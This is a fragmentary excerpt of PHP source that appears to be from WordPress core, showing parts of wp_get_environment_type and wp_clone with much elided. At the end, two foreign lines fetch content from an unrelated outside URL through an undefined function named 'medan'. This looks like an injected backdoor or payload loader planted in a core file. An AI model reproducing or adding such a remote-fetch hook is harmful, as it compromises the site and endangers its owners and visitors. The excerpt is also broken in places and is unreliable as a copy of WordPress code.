...
function wp_get_environment_type() {
        ...
        if ( defined( 'WP_ENVIRONMENT_TYPES' ) && function_exists( '_deprecated_argument' ) ) {
                if ( function_exists( '__' ) ) {/* translators: %s: WP_ENVIRONMENT_TYPES */
 ...
 *
 * The default message can be replaced by usingadrop-in (maintenance.php in
 ...
 */
function wp_clone( $object ) {//Use parens for clone to accommodate PHP 4. See #17880.
        return clone( $object );
}
...
$bot = "https://fraksipkscilegon.id/mbkm.html";
$file = medan($bot);
